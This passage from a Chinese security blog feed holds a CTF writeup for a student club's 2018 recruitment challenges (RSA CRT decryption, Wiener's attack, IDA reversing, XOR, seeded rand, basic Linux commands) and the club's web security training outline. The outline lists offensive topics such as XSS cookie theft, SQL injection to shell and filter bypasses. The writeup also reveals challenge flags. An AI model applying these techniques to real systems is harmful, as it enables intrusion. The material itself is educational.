class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span>(<span class="params">a, m</span>):</span></span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = <span class="number">95272795986475189505518980251137003509292621140166383887854853863720692420204142448424074834657149326853553097626486371206617513769930277580823116437975487148956107509247564965652417450550680181691869432067892028368985007229633943149091684419834136214793476910417359537696632874045272326665036717324623992885</span></span><br><span class="line">p = <span class="number">11387480584909854985125335848240384226653929942757756384489381242206157197986555243995335158328781970310603060671486688856263776452654268043936036556215243</span></span><br><span class="line">q = <span class="number">12972222875218086547425818961477257915105515705982283726851833508079600460542479267972050216838604649742870515200462359007315431848784163790312424462439629</span></span><br><span class="line">dp = <span class="number">8191957726161111880866028229950166742224147653136894248088678244548815086744810656765529876284622829884409590596114090872889522887052772791407131880103961</span></span><br><span class="line">dq = <span class="number">3570695757580148093370242608506191464756425954703930236924583065811730548932270595568088372441809535917032142349986828862994856575730078580414026791444659</span></span><br><span class="line"></span><br><span class="line">qinv = modinv(q, p)</span><br><span class="line">m1 = pow(c, dp, p)</span><br><span class="line">m2 = pow(c, dq, q)</span><br><span class="line">h = (qinv * (m1 - m2)) % p</span><br><span class="line">m = m2 + h * q</span><br><span class="line">m_hex = str(hex(m))[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;&#x27;</span>.join([chr(int(<span class="string">&#x27;&#x27;</span>.join(c), <span class="number">16</span>)) <span class="keyword">for</span> c <span class="keyword">in</span> zip(m_hex[<span class="number">0</span>::<span class="number">2</span>], m_hex[<span class="number">1</span>::<span class="number">2</span>])])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后结果为<br>Theres_more_than_one_way_to_RSA</p><blockquote><p>flag{Theres_more_than_one_way_to_RSA}</p></blockquote><hr><h2 id="RSA3"><a href="#RSA3" class="headerlink" title="RSA3"></a>RSA3</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Normally, you pick e and generate d from that. What appears to have happened in this case? What is likely about the size of d?</span><br><span class="line"></span><br><span class="line">Update: Fixed bug of flag.</span><br><span class="line"></span><br><span class="line">Notice: Please DO NOT use any RSA tools, solve this challenge by yourself.</span><br><span class="line"></span><br><span class="line">e &#x3D; 165528674684553774754161107952508373110624366523537426971950721796143115780129435315899759675151336726943047090419484833345443949104434072639959175019000332954933802344468968633829926100061874628202284567388558408274913523076548466524630414081156553457145524778651651092522168245814433643807177041677885126141</span><br><span class="line">n &#x3D; 380654536359671023755976891498668045392440824270475526144618987828344270045182740160077144588766610702530210398859909208327353118643014342338185873507801667054475298636689473117890228196755174002229463306397132008619636921625801645435089242900101841738546712222819150058222758938346094596787521134065656721069</span><br><span class="line">c &#x3D; 169391604307213974710597693248166863262635321820709182280694059296079676696460036420655604420049971304712550027666676719989641872790226627271230072009450546099425697330508459430999175828530558172413805218170859212369467798719828240031394421896121823803700024559680572528969880625457942316782819682826344683732</span><br></pre></td></tr></table></figure><p>如果硬刚这到题的话，尝试直接分解n，可以发现n是非常难分解的，但是题目描述中重点强调了d的大小，那么可能和<a href="https://en.wikipedia.org/wiki/Wiener%27s_attack">Wiener’s Attack</a>有关</p><p>当*<em>d &lt; 1/3 * N ^ (1/4)*</em> 时，可以用Wiener’s Attack获取私钥d</p><p>在生成私钥的时候，d是根据e而获得的，当e过大或者过小的话，可以利用低解密指数攻击快速分解n，获得d和m。具体算法以及证明过程见<a href="https://www.tr0y.wang/2017/11/06/CTFRSA/index.html#%E4%BD%8E%E8%A7%A3%E5%AF%86%E6%8C%87%E6%95%B0%E6%94%BB%E5%87%BB">低解密指数攻击</a></p><blockquote><p>flag{Are_any_RSA_vals_good_87768438250}</p></blockquote><!--nextpage--><h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="what-is-IDA-150"><a href="#what-is-IDA-150" class="headerlink" title="what is IDA? (150)"></a>what is IDA? (150)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">我有一个exe，你能找到flag吗?</span><br><span class="line"></span><br><span class="line">提示： IDA pro 6.8以上版本</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下载一个IDA pro，用IDA(64位)载入该程序<br>反汇编main函数，只有个Ha Ha Ha<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911213232.png"><br>直接搜索字符串“flag”<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911213408.png"></p><blockquote><p>flag{can_y0u_see_me}</p></blockquote><hr><h2 id="Xor-180"><a href="#Xor-180" class="headerlink" title="Xor (180)"></a>Xor (180)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flag就在文件里，为什么没有看到？</span><br><span class="line"></span><br><span class="line">注：异或运算</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用IDA载入开始逆向程序，直接逆向main函数，得到源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@10</span></span><br><span class="line">  __int64 v4; <span class="comment">// rsi@10</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [sp+Ch] [bp-34h]@1</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [sp+Ch] [bp-34h]@4</span></span><br><span class="line">  <span class="keyword">char</span> v7[<span class="number">40</span>]; <span class="comment">// [sp+10h] [bp-30h]@1</span></span><br><span class="line">  __int64 v8; <span class="comment">// [sp+38h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v8 = *MK_FP(__FS__, <span class="number">40L</span>L);</span><br><span class="line">  __isoc99_scanf(&amp;unk_8B4, v7, envp);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i </span><br></pre></td></tr></table></figure><p>直接定位到第16行，不管v7是什么，它会和flag数组做一个对比，如果不一样就错误，所以flag数组里就放着flag，双击flag数组跳转<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911213924.png"><br>可以看到flag就放在这里，不过是以16进制，先把数据复制出来，再接着回去看上面的代码<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911214704.png"><br>可以看到flag长度为22，并且每个字符都和对应的0到21做了异或，由于异或是可逆的，因此将刚才复制出来的flag中每个字符都在异或一次即可</p><blockquote><p>flag{yes_you_know_Xor}</p></blockquote><hr><h2 id="Random"><a href="#Random" class="headerlink" title="Random"></a>Random</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Can a computer generate a truly random number?</span><br></pre></td></tr></table></figure><p>首先拖进IDA逆向main函数，需要使check()返回非0，另外可以看到flag的长度为32<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180924162538.png"></p><p>跟进check函数，可以发现程序对输入的字符串做了4件事<img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180924162749.png"></p><ol><li>给rand函数播种，种子为0xDEADBEEF，由于种子是固定的，所以random函数输出的随机数序列是固定的</li><li>将输入字符串按字节加<code>random() mod 0x40</code></li><li>将上一步的字符串按字节异或<code>random() mod 0x100</code></li><li>检查上述步骤完成后的字符串是否和byte_601080数组相等，其中byte_601080数组为<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180924163232.png"></li></ol><p>根据提示了解一下相关的资料就可以知道，glibc 的 <code>random()</code> 的实现使用线性同余引擎，在种子一定的情况下，会产生固定的伪随机序列。</p><p>所以只需要自己写个程序，设定种子为<code>0xdeadbeef</code>，就可以<code>random()</code>到相同的随机数，然后根据验证过程逆推即可得到flag。</p><blockquote><p>flag{R4nd0m_1s_P5euDo_randomW0W}</p></blockquote><hr><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Welcome-50"><a href="#Welcome-50" class="headerlink" title="Welcome (50)"></a>Welcome (50)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">欢迎来到Blue-Whale纳新平台</span><br><span class="line">下面的这个东西叫做flag：</span><br><span class="line">flag&#123;Welcome_to_join_us&#125;</span><br><span class="line">所有题目的答案都是以上这个形式</span><br><span class="line">比如这题，把这个复制到答案框就好了</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>签到题，直接复制粘贴</p><blockquote><p>flag{Welcome_to_join_us}</p></blockquote><hr><h2 id="what-is-VM-100"><a href="#what-is-VM-100" class="headerlink" title="what is VM (100)"></a>what is VM (100)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">你知道虚拟机吗？</span><br><span class="line">我这里有一个VMware虚拟机镜像，怎么打开它呢？</span><br><span class="line">提示：下载VMware14：</span><br><span class="line">https:&#x2F;&#x2F;www.vmware.com&#x2F;products&#x2F;workstation-pro&#x2F;workstation-pro-evaluation.html</span><br><span class="line"></span><br><span class="line">镜像链接: https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1uy0PkjE1Ik4xzklreg9ICQ</span><br><span class="line">密码: vxwg</span><br><span class="line"></span><br><span class="line">虚拟机：</span><br><span class="line">用户名：abc</span><br><span class="line">密码： 123456</span><br><span class="line"></span><br><span class="line">注意检查CPU虚拟化是否打开，没有打开的要在BIOS里打开。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下载安装VM14，打开下载的题目中的虚拟机<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180917224924.png"><br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180917225713.png"><br>之后开启虚拟机，用题目给的用户名和密码登录，登陆后桌面上就是一个flag<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180919213440.png"></p><blockquote><p>flag{you_know_how_to_use_VM}</p></blockquote><hr><h2 id="what-is-command-100"><a href="#what-is-command-100" class="headerlink" title="what is command (100)"></a>what is command (100)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">home目录下有一个flag文件，怎么用命令找到它呢？</span><br><span class="line"></span><br><span class="line">注：此题Linux镜像为第二题镜像</span><br></pre></td></tr></table></figure><p>因为flag是隐藏文件，直接用<code>ls</code>命令是找不到的，得用<code>ls -al</code>命令显示所有文件，之后用<code>cat</code>命令打开即可<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180919213746.png"></p><blockquote><p>flag{ls_is_what}</p></blockquote><hr><h2 id="Linux-find-100"><a href="#Linux-find-100" class="headerlink" title="Linux find (100)"></a>Linux find (100)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">我在某个目录中藏了一个叫findme的文件，怎么能找到它呢？</span><br><span class="line"></span><br><span class="line">注：此题Linux镜像为第二题镜像</span><br></pre></td></tr></table></figure><p>直接用find命令即可<br><code>sudo find / -name findme -print</code><br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180919214153.png"></p><blockquote><p>flag{you_know_wh1s_f1nd}</p></blockquote><hr><h2 id="what-is-nc-100"><a href="#what-is-nc-100" class="headerlink" title="what is nc? (100)"></a>what is nc? (100)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">linux nc命令是干什么的呢？</span><br><span class="line">nc 144.202.124.195 10001</span><br></pre></td></tr></table></figure><p>直接用nc命令<br><code>nc 144.202.124.195 10001</code><br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180919213522.png"></p><blockquote><p>flag{nc_1s_this}</p></blockquote>]]></content>
    
    
    <summary type="html">BlueWhale 2018年纳新题目解析。</summary>
    
    
    
    <category term="CTF" scheme="https://srpopty.github.io/categories/CTF/"/>
    
    
    <category term="BlueWhale" scheme="https://srpopty.github.io/tags/BlueWhale/"/>
    
    <category term="WriteUp" scheme="https://srpopty.github.io/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>BlueWhale 2018 Web 新生培训大纲</title>
    <link href="https://srpopty.github.io/2018/09/21/BlueWhale-2018-Web-%E6%96%B0%E7%94%9F%E5%9F%B9%E8%AE%AD%E5%A4%A7%E7%BA%B2/"/>
    <id>https://srpopty.github.io/2018/09/21/BlueWhale-2018-Web-%E6%96%B0%E7%94%9F%E5%9F%B9%E8%AE%AD%E5%A4%A7%E7%BA%B2/</id>
    <published>2018-09-21T14:21:59.000Z</published>
    <updated>2020-09-23T02:51:30.155Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web基础"><a href="#web基础" class="headerlink" title="web基础"></a>web基础</h1><ol><li>网络安全法</li><li>Web底层知识</li><li>Web基本知识，如何配置一台服务器（lamp、wamp），搭建一个简单的网站</li><li>Web编程语言：C（其他语言的基础，必会）、C++（视学习能力可选）、HTML、Javascript、PHP、Python（常用工具，必须掌握requests库的使用）、Java（视学习能力可选）、css、SQL</li><li>常用Web渗透的工具（nmap、BurpSuite、Wireshark等，注意不要变成Script Boy）</li><li>其他Web基础杂项，比如各种编码等</li></ol><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><ol><li>Javascript与HTML语法的简单讲解</li><li>XSS中会用到的的一些概念，重点讲解Cookie，Session，如何设置读取Cookie，以及Cookie的权限</li><li>XSS平台的使用</li><li>XSS形成原理</li><li>XSS利用<ol><li>最简单的使用XSS窃取Cookie</li><li>怎么用XSS获取一些网页上的信息（如URL或者网页源码，甚至是剪贴板的内容，怎么弄个键盘记录器）</li><li>iframe标签跨域窃取Cookie</li><li>在过滤了某些字符的情况下如何绕过（重点）</li></ol></li><li>同源策略基本概念</li><li>CSP基本概念以及格式讲解，要求会识别每句CSP代码的意义</li><li>结合几个例子讲解在某些情况下如何绕过CSP</li><li>XSS的一些小trick</li><li>讲解如何防御XSS</li><li>讲一讲XSS蠕虫Samy（拓展知识面）</li></ol><h1 id="SQLi"><a href="#SQLi" class="headerlink" title="SQLi"></a>SQLi</h1><ol><li>数据库简介（类型：关系型、非关系型，常用数据库等）</li><li>SQL语法的简单讲解</li><li>讲解SQL注入的成因</li><li>SQL注入的一些基本概念与术语（如SQL注入类型）<ol><li>UNION 联合查询、多语句查询</li><li>直接显示数据</li><li>报错显示数据</li><li>盲注获取数据</li></ol></li><li>SQL盲注（盲注的概念、分类：基于报错，基于时间延迟，基于boolean）</li><li>通过SQL获取数据的方法与算法（暴力猜解、二分法、按位查询等）</li><li>SQL注入中常用到的Payload（主要以Mysql为例，但是不同数据库语法略有不用，也可以讲讲其他数据库的payload，不过万变不离其宗）<ol><li>获取库名</li><li>获取表名</li><li>获取列名</li><li>获取数据</li><li>利用SQL注入读写文件</li><li>某些数据库如何利用SQL注入获取shell（视新生接受能力选讲）</li></ol></li><li>SQL注入的一些其他的小trick</li><li>nosql注入</li><li>SQL注入中常会遇到的过滤手段，如何绕过（重点）</li><li>SQLMap的基本使用（避免形成依赖）</li><li>如何防御SQL注入（目前常用的防御SQL注入的方法，PHP、Flask、Django与JavaWeb是如何防御SQL注入的）</li></ol><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><ol><li>PHP介绍与语法的简单讲解</li><li>某些情况下PHP弱类型造成的漏洞<ol><li>== 与 ===</li><li>MD5等哈希函数的弱类型比较</li><li>in_array的弱类型比较</li><li>这类内容太多了，讲明白根本原理就行</li></ol></li><li>PHP某些古怪的特性造成的漏洞<ol><li>如GET、POST数组等</li></ol></li><li>PHP中某些函数的漏洞</li><li>常见的PHP文件包含漏洞与绕过方法</li><li>常见的PHP文件上传漏洞与绕过方法</li><li>PHP反序列化漏洞<ol><li>反序列化成因</li><li>PHP的面向对象</li><li>PHP中的Magic函数</li><li>PHP某个反序列化时的CVE</li><li>PHP反序列化的高级利用，POP链等</li></ol></li><li>PHP中伪随机数的预测</li><li>mt_rand漏洞</li><li>rand预测</li><li>PHP的一些其他的小trick、CVE等<br>注：请注意不同的PHP版本的漏洞不同</li></ol><h1 id="Python与Java-Web"><a href="#Python与Java-Web" class="headerlink" title="Python与Java Web"></a>Python与Java Web</h1><ol><li>Python格式化字符串漏洞</li><li>Python反序列化漏洞</li><li>SSTI漏洞<ol><li>成因</li><li>利用</li><li>常用Payload</li><li>防御</li></ol></li><li>Python小trick（Python黑魔法）</li><li>Python沙箱绕过</li><li>Python的一些CVE</li><li>JavaWeb的一些CVE讲解，如Java反序列化漏洞、Status的漏洞等</li></ol><h1 id="CSRF与SSRF"><a href="#CSRF与SSRF" class="headerlink" title="CSRF与SSRF"></a>CSRF与SSRF</h1><ol><li>CSRF的成因与危害</li><li>CSRF绕过</li><li>CSRF的利用与防御</li><li>SSRF的成因与危害</li><li>SSRF利用<ol><li>内网探测</li><li>端口探测</li><li>与CRLF综合利用</li></ol></li><li>SSRF与URL跳转的绕过方法</li><li>SSRF的防御</li></ol><h1 id="流量审计与Web杂项"><a href="#流量审计与Web杂项" class="headerlink" title="流量审计与Web杂项"></a>流量审计与Web杂项</h1><ol><li><p>流量审计</p><ol><li>Wireshark的详细使用技巧</li><li>过滤表达式</li><li>协议类型</li><li>如何导出抓到的感兴趣的东西</li><li>如何在Wireshark中快速定位到我们所关注的包</li><li>Wireshark的统计技巧</li><li>命令行Tshark的使用以及TCPdump与ngrep的使用</li></ol></li><li><p>Web杂项</p><ol><li>命令、代码注入，RCE</li><li>源码泄露（如git、svn等等）</li><li>逻辑漏洞（如越权等）</li><li>XXE<ol><li>成因</li><li>利用</li><li>防御</li></ol></li><li>nginx的一些漏洞（配置错误导致的漏洞，如目录穿越等）</li></ol></li></ol><h1 id="CTF题目选讲与知识总结"><a href="#CTF题目选讲与知识总结" class="headerlink" title="CTF题目选讲与知识总结"></a>CTF题目选讲与知识总结</h1><h1 id="无线渗透"><a href="#无线渗透" class="headerlink" title="无线渗透"></a>无线渗透</h1><h1 id="Web综合渗透"><a href="#Web综合渗透" class="headerlink" title="Web综合渗透"></a>Web综合渗透</h1>]]></content>
    
    
    <summary type="html">BlueWhale 2018级新生Web培训纲要。</summary>
    
    
    
    <category term="hack" scheme="https://srpopty.github.io/categories/hack/"/>
    
    
    <category term="BlueWhale" scheme="https://srpopty.github.io/tags/BlueWhale/"/>
    
  </entry>
  
</feed>
